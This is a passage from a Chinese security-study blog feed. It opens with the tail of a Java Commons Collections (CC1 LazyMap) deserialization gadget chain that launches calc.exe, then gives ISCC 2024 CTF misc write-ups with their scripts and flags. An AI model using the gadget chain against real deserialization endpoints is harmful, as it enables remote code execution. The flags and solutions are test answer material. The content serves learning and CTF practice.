class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/666309a807b7f.png" alt="image-20240529171215211"></p><p>LazyMap的漏洞触发在get和invoke中，完全没有setValue什么事，这也说明8u71后不能利用的原因和 AnnotationInvocationHandler.readObject 中有没有setValue没任何关系(证明了我们的上一个链子说的)</p><p>调用流程：</p><blockquote><p>AnnotationInvocationHandler.readObject-&gt;<br>    Map(proxy).entrySet-&gt;<br>        AnnotationInvocationHandler.invoke-&gt;<br>            LazyMap.get-&gt;</p><p>​             factory.transform</p><p>​             ….后面和TransformedMap链一样了</p><p>​              -&gt;ChainedTransformer.transform()<br>​              -&gt;ConstantTransformer.transform()<br>​              -&gt;InvokerTransformer.transform()<br>​                 -&gt;Method.invoke()<br>​                    -&gt;Class.getMethod()<br>​              -&gt;InvokerTransformer.transform()<br>​                 -&gt;Method.invoke()<br>​                    -&gt;Runtime.getRuntime()<br>​               -&gt;InvokerTransformer.transform()<br>​                  -&gt;Method.invoke()<br>​                     -&gt;Runtime.exec()</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java </tag>
            
            <tag> 学习 </tag>
            
            <tag> CC链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC-wp</title>
      <link href="/2024/05/25/ISCC-wp/"/>
      <url>/2024/05/25/ISCC-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="ISCC-2024"><a href="#ISCC-2024" class="headerlink" title="ISCC 2024"></a>ISCC 2024</h1><p>wp是真的多 </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="练武题"><a href="#练武题" class="headerlink" title="练武题"></a>练武题</h3><h4 id="FunZip"><a href="#FunZip" class="headerlink" title="FunZip"></a>FunZip</h4><p>给了附件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VTFSS2MyUldhM2xsUkZaaFVqRlZORmxXWXpWbGJWSkpVMjE0V2xaNlFYSlJNbU01VUZG</span><br><span class="line">VTFSS2MyUldhM2xsUkVaaFVqRlZORmw2VGxObFYwWllUbGMxVVZveU9EbEVVUX</span><br><span class="line">VTFSS2MyUldhM2xsUkVaaFVqRlZORmRVVGs5TlIwNTBZa2hXWVdWcVVreEVWcI</span><br><span class="line">VTFSS2MyUldhM2xsUkVaaFVqRlZORmRVVGs5TlJuWklZa2hhVVZveU9EbEVVUW</span><br><span class="line">VTFSS1UySkdjSFJpU0ZaaFZUQktNRmRXYUc5a1ZXeEZZWHBXVUZWWE9EbEVaQv</span><br><span class="line">VVRKak9WQlJNY0</span><br><span class="line">V2tab1QyTkhTblJaTW1ScFlsVmFNVmRzYUU5a01XeFlWRzE0U2xORk5IZFhhMUo2VTNjeN</span><br><span class="line">VVRKak9WQlJNTm</span><br><span class="line">VjFSS2IyRkhUbkJWYlhCYVZtNVNNRmRXYUc5a1ZtaFdaREprV2sxcmNHbFpiR1JIVGtkS2M6MUVaRVJhZWpBNVJGV6</span><br><span class="line">VVRKak9WQlJNVk</span><br><span class="line">V1Zaak1VMUZiRWhVYmxKcVVUSm9ObHBGYUV0alIzcDBXVEprV2xVelpHNVplazVUWlZkR1dFNVhOVXBTTW14M1VUSmpPVkJSTWz</span><br><span class="line">V2xoa2RsQlJNZg</span><br><span class="line">VTFWT1Fsb3piRWhpUnpGTVVqTldNVmw2U25OT2JIQlVXak5DU2xKRVVtNVhWMnN4WlcxR1dXTkhlRXhSTW5SM1VUSmpPVkJSTXr</span><br><span class="line">VTFWT1Fsb3diRVJpVjJSS1lqYktOVmRzYUZOTlYwNTBUa2RrVGxaSVRreEVZbY</span><br><span class="line">VTFWT1Fsb3diRWhXYms1cVRXeFdibGxXWkZwaU1XeFVUbGh3YUZkSVFuTlRNRTV5V2pGQ1JGRnRiRTFpYXpWM1dsY3hWbUl3ZEZSaE1ITk9</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQktOVmRzYUZOTlYzNTBUa2RrVFZaRlZUTlJNbU01VUZFdz</span><br><span class="line">VTFWT1Fsb3diRWhXYms1cVRXeFdURVJr</span><br><span class="line">VTFWT1Fsb3diRWxqTUhOT5</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQktkRmxxVGtwaU1rWllUbFJDU2xJeWRHNVZSazVDWkRBNU5WRnVRa3BTU0dSdVYxWk5NV1Z0UmxsalIzaE1VVEp6TTFOVlpISmphM1ExWVRCelRq</span><br><span class="line">VTFWT1Fsb3liRVJSVjJSS1VUSkpNMUV5WXpsUVVUSt</span><br><span class="line">VTFWT1Jsb3hiRVJSVjJSS1VURkdibE5WVGtKYU1rWllWMWM1V2xadVVuZFhSazVDVDBWc1NGTnRTbWhXYWtKM1VUSmpPVkJSTVJ</span><br><span class="line">VTFWT1Fsb3diRVJaVjJSS1dUQkdibE5WVGxKYU1HeEVXVmRsU2xORmNITmFSV2hYWlZkS2NGbFlVbDVXU0U1TVJGbF</span><br><span class="line">VTFWT2Zsb3hiRVJSVjJSS1VURkdibE5WVGtKaU1rWllWMWM1V2xadVVuZFhSazVDU3pGc1NGTnRTbWhXaWtKM1VUSmpPVkJSTWa</span><br><span class="line">VTFWT1Fsb3diRVJZVjJSS1dEQkdibE5WVGtKYU1HeEVXRmRrU2xORmNITmFSV2hYWlZkS2NGaFlhRkJrTWpoNVJGaF</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQkpOVkV5WXpsUVVUQ0</span><br><span class="line">VTFWT1Fsb3diRVJrVjJSS1pEQktOVmRzYUZOTlYwNTBUa2RrVGxKSVRreEVaSp</span><br><span class="line">VTFWT1Fsb3diRWxOUlhOT0</span><br><span class="line">V214R2RsQlJNbp</span><br><span class="line">VVRKak9WQlJNVI</span><br><span class="line">V2tjd05XTkdjRVJSYm14aFYwVTFjMXBGWkVaaW1rMTZWVzVzYWZaNlZuVlRWV1JHWTBWT2JsQlVNRTW</span><br><span class="line">V2xoa2RsQlJNWA</span><br><span class="line">VTFWT2Rsb3hiRWhOVjNocFYwVTFjMXBGVG05aGJHeFVaRE5rVFZORk5YZGFWekZYWkd4d2NHRkhjRnBWTW5SM1ZETmtkbEJSTWQ</span><br><span class="line">VTFWT1Fsb3liRWhYYmxwcVlWZG9kMWx0TlZKYU1rWlVVVlJzU2xKRlJUTlRWV1J5V2pGQ1JGRnRhRTFpYXpWM1dsY3hWbUx5ZEZWak1tUm9WVE5PZVZNeFJuWlFVVEw</span><br><span class="line">VTFWT1Fsb3diRWxqTUhOTw</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQktjVmRXV2pCalJtaFVVVlJzU2xJd1dtbFhWazB4WlcxR1dXTkhlRXhSTW5Rd1ZGWk5lR05HYUZSUldGSktVVEpPTTFOdWNIcFRkekE</span><br><span class="line">VTFWT1Fsb3diRWxOUlhOTw</span><br><span class="line">V214R2RsQlJNcw</span><br><span class="line">VVRKak9WQlJNTQ</span><br><span class="line">V2tjd05XTkdjRVJSYm14aFYwVTFjMXBGWkVwaU1rMTZWVzVzYUZaNlZuVlRWV1JLWTBWT2JsQlVNRTQ</span><br><span class="line">V2xoa2RsQlJNMQ</span><br><span class="line">VTFWT2Zsb3hiRWhOVjNocFYwVTFjMXBGVG05aGJHeHdaRE5rVFZORk5YZGFWekZYWkd4d2NHRkhjRnBoVjNSM1ZETmtkbEJSTWY</span><br><span class="line">VTFWT1Fsb3diRWhYYmxwcVlWZG9kMWx0TlZKYU1rWlVVVlJzU2xKRlJUTlRWV1J5V2pGQ1JGRnRiRTFpYXpWM1dsY3hWbUl3ZEZWak1tUm9WVE5PZVZNeFJuWlFVVEI</span><br><span class="line">VTFWT1Fsb3diRWxqTUhOTw</span><br><span class="line">VTFWT1Fsb3hiRVJSVjJSS1VURktjVmRYZURGalJtaFVVVlJzU2xJeGNHbFhWMnN4WlcxR1dXTkhlRXhSTW5ReFZGWk5lR05HYUZSUldGSktVVEpPTTFOdWNIcFRkekU</span><br><span class="line">VTFWT1dsb3hiRVJSVjJSS1VURkdNbFJFVGtObFYwWllUbFJDWVdGWFpIQlRiR1JTWVZWNFNGUnRiRmhOYlhoclV6RlNlbE4zTVc</span><br><span class="line">VTFWT1Fsb3diRWxOUlhOTw</span><br><span class="line">V214R2RsQlJNeg</span><br><span class="line">VVRKak9WQlJNMA</span><br><span class="line">V1hwT1UyVlhSbGhPVnpWS1VqRmFjbGRyVG05bGJWSkpVMjVDYVdKWFRtNVhWazR6V2pKTmVsVnViR2hXZWxaMVUxVmtTbU5GZURWTU1uaHdZMVZTZEdONlZsWlRkekY</span><br><span class="line">V2xoa2RsQlJNcg</span><br><span class="line">VTFWT1Fsb3diRWxUYlhocVRXeFpkMWRXVG05aFJYUlZZek5hVFVzeVJreGhXRlpvWkcxdmVsVjZVbTVVTVUwMVlXMVdXR1JITVZCYVYwWnZWREZrTUdKRGRHeGpNMEl4VmpGQ2RGUXlSa3BoTURsb1ZtNU9VRll6VW5ObFdIQnpaRmRLYVdFelZrdFdSekZ3WWpOS2RHSkhTa1ZpYmxVd1ZrZDRlVTVFVG5aa2FsSnRZbGUxYUZkSGRESmphVGx5WkZlNE0ySkhkRXBPTTBKMVdWVjRlbVJWYTNwaVIzUktaVzEwTWxkVVRuUmlSMHBGWW0wd00yRnRlSEJqVlVaTVJGZQ</span><br><span class="line">VTFWT1Fsb3diRWxUYlhocVRXeFpkMWRYYkc5aFZYUlZZekJ6VGc</span><br><span class="line">VTFWT1Fsb3diRWhYYmxwcVlWZG9kMWx0TlZKYU1rWlVWRlJzU2xKRlJUTlRWV1J5V2pGQ1JGUnVVbHBYUjJneFZETnNRMk5GZERWak0wSkVXbm93T1VSVQ</span><br><span class="line">VTFWT1Fsb3diRWxqTUhOTw</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQktjVmRXV2pCalJtaFVVVlJzU2xJd05XOVdla3B6V2tWc1JHTXlaRnBOYTNCcFdWWlpkMDR3VG01UVZEQk8</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQktkMWR0Ykc5aGJHeFhaRWhDV1ZVd1JYSlZSazVDWlZWMFdXTXdjMDQ</span><br><span class="line">VTFWT1Fsb3diRVJVVjJSS1ZEQkdibE5WVGtKYU1XdDVVbTFLYUZVelRqUlhSazVDWTJ4Q1ZGUllhRkJrTWpnNVJGUQ</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1XdDVVbTFLYUZacVFtNVVSbEYzV2pBeGNXTXdjMDQ</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQkpOVkV5WXpsUVVUQQ</span><br></pre></td></tr></table></figure><p>应该是什么隐写</p><p>感觉像base的</p><p>用工具：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc350e893.png" alt="image-20240501204737068"></p><p>所以flag:</p><p>ISCC{xoMjL8NuYRRb}</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc356b33d.png" alt="image-20240501204825447"></p><h4 id="Number-is-the-key"><a href="#Number-is-the-key" class="headerlink" title="Number_is_the_key"></a>Number_is_the_key</h4><p>附件是一个excl表格 但里面没有东西</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc34d6cd0.png" alt="image-20240501205037401"></p><p>题目描述：The answers to the questions are hidden in the numbers.</p><p>应该也是隐写术</p><p>用脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> load_workbook</span><br><span class="line"><span class="keyword">from</span> openpyxl.styles <span class="keyword">import</span> PatternFill</span><br><span class="line"></span><br><span class="line">wb = load_workbook(<span class="string">&#x27;C:\\Users\\admin\\Downloads\\attachment-1.xlsx&#x27;</span>)</span><br><span class="line">ws = wb.active</span><br><span class="line"></span><br><span class="line">bold_cells = []</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> ws.iter_rows():</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> row:</span><br><span class="line">        <span class="keyword">if</span> cell.font.bold:</span><br><span class="line">            bold_cells.append(cell.coordinate)</span><br><span class="line"></span><br><span class="line">highlight_style = PatternFill(start_color=<span class="string">&quot;FFFF00&quot;</span>, end_color=<span class="string">&quot;FFFF00&quot;</span>, fill_type=<span class="string">&quot;solid&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cell <span class="keyword">in</span> bold_cells:</span><br><span class="line">    ws[cell].fill = highlight_style</span><br><span class="line"></span><br><span class="line">wb.save(<span class="string">&#x27;ll.xlsx&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;加粗的单元格已设置为高亮并保存到 highlighted_excel_file.xlsx 文件中。&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fc363e2ed.png" alt="image-20240501205536936"></p><p>ll.xlsx:</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc353418f.png" alt="image-20240501210433718"></p><p>看上去是空白文件</p><p>但是这里要缩小看：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc34d3cb0.png" alt="image-20240501210507974"></p><p>已经缩到最小了 还是看不完</p><p>要调一下行和列</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc356d622.png" alt="image-20240501211011737"></p><p>可以扫了：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc35078bf.png" alt="image-20240501211106951"></p><p>ISCC{CYj8Zgy2nyXd}</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc357b402.png" alt="image-20240501211156103"></p><h4 id="RSA-KU"><a href="#RSA-KU" class="headerlink" title="RSA_KU"></a>RSA_KU</h4><p>rsa</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc361771a.png" alt="image-20240508211031074"></p><p>轩禹梭哈</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3614840.png" alt="image-20240508212935674"></p><p>ISCC{GN08Dq52B6jY2OOoyQ–}</p><h4 id="时间刺客"><a href="#时间刺客" class="headerlink" title="时间刺客"></a>时间刺客</h4><p>两个文件</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3523859.png" alt="image-20240508220141048"></p><p>7z由密码</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc352b9d2.png" alt="image-20240508220240041"></p><p>流量文件打开</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3588ca7.png" alt="image-20240508220430285"></p><p>USB流量分析</p><p>先执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6642054634d66.png" alt="image-20240513201917300"></p><p>在跑脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;D:\\流量\\attachment-27(1)\\usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># 鼠标流量的话len改为8</span></span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6642070f26627.png" alt="image-20240513202654460"></p><p>得到解压密码：PR3550NWARDSA2FEE6E0</p><p>要全小写</p><p>解压</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PR3550NWARDSA2FEE6E0</span></span><br><span class="line"><span class="comment">#pr3550nwardsa2fee6e0</span></span><br><span class="line"><span class="keyword">import</span> time,os</span><br><span class="line">num=<span class="number">34</span></span><br><span class="line">a=os.listdir(<span class="string">&quot;./%s&quot;</span>%num)</span><br><span class="line">t=<span class="number">1728864000</span></span><br><span class="line">b=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    mtime = time.localtime(os.path.getmtime(<span class="string">&quot;./%s/.%s.txt&quot;</span>%(num,i)))</span><br><span class="line">    mtime=<span class="built_in">int</span>(time.mktime(time.strptime(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, mtime), <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)))</span><br><span class="line">    b+=<span class="built_in">chr</span>(mtime-t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ISCC&#123;%s&#125;&quot;</span>%b)</span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6642317f8337f.png" alt="image-20240513232758462"></p><h4 id="成语学习"><a href="#成语学习" class="headerlink" title="成语学习"></a>成语学习</h4><p>又是流量分析</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc354025e.png" alt="image-20240508221530403"></p><p>找出解压密码</p><p>57pmYyWt</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc362606c.png" alt="image-20240508221634372"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fc350eaaf.png" alt="image-20240508221744427"></p><p>明显少了后缀</p><p>加一个zip后缀 解压</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3580ea3.png" alt="image-20240508221909013"></p><p>找flag</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc34d2d10.png" alt="image-20240508222017431"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fc352f4a1.png" alt="image-20240508222039747"></p><p>题目名字是成语学习</p><p>所以我们将成语和英语提出来</p><p>淡而无味  noodle</p><p>成语是密文 英文是密钥</p><p><img src="https://bu.dusays.com/2024/05/25/6651fc3501cf8.png" alt="image-20240508223016593"></p><p>4fcf6085d24eb08b4e068a9bf600bda7</p><p>ISCC{4fcf6085d24eb08b4e068a9bf600bda7}</p><h4 id="工业互联网模拟仿真数据分析"><a href="#工业互联网模拟仿真数据分析" class="headerlink" title="工业互联网模拟仿真数据分析"></a>工业互联网模拟仿真数据分析</h4><p><img src="https://bu.dusays.com/2024/05/13/66420aae81707.png" alt="image-20240513204221412"></p><p>wireshark打开流量</p><p><img src="https://bu.dusays.com/2024/05/13/66420b491a112.png" alt="image-20240513204456290"></p><p>研究后发现：</p><p>第一问：</p><p>192.168.1.2 </p><p>192.168.1.4 的 Length 大小不变</p><p>192.168.1.2,192.168.1.4,24</p><p>第二问：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -r a.pcap -T fields -e data.data -Y &quot;data.len==12&quot; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024f7b039ae1f546c8e8b1b</span><br><span class="line">2024b939b6fdd3a92dacee64</span><br><span class="line">2024fd300d3fd17b85d1ae51</span><br><span class="line">20249cf615176e00d3fde264</span><br><span class="line">20247b5207a1d2b639fe1e55</span><br><span class="line">202432b3b42ff36424a15d01</span><br><span class="line">2024f2122ad847094be81d58</span><br><span class="line">2024e866d7ec7b7d5ae618bf</span><br><span class="line">20244057c7e66ca371b2c938</span><br><span class="line">202433b4fba38bac7e29bc6a</span><br><span class="line">2024796986cd9b1fc559ad61</span><br><span class="line">220248c6b6efd392e9839a3eb</span><br><span class="line">202462434670e7e76d766c58</span><br><span class="line">20241cc66ab532ff8c8f1d2e</span><br></pre></td></tr></table></figure><p>结果很明显了：2024</p><p>第三问：</p><p>看文末的流量分组 </p><p>第五组 - 192.168.1.3 192.168.1.5， 这一组的时间间隔固定</p><p>192.168.1.3,192.168.1.5,0.06</p><p>第四问：</p><p>看文末的流量分组，就能看出这三个 IP 是有业务关联性的 </p><p>192.168.1.3 –&gt; 192.168.1.2 –&gt; 192.168.1.6 </p><p>192.168.1.2,192.168.1.3,192.168.1.6</p><p>第五问：</p><p>五个字符的校验算法，先假设是 CRC16 或者 CRC32 </p><p>倒数位必为 1 </p><p>尝试 CRC16 CRC32 并尝试 0-10 为起始位 、</p><p>为 CRC16,4,1 时成功提交 </p><p>192.168.1.2,192.168.1.4,24 </p><p>2024</p><p>192.168.1.3,192.168.1.5,0.06 192.168.1.2,192.168.1.3,192.168.1.6 CRC16,4,1 ISCC{192.168.1.2,192.168.1.4,24,2024,192.168.1.3,192.168.1.5,0.06,192.168.1.2,192.168.1.3,192.168.1.6,CRC16,4,1} 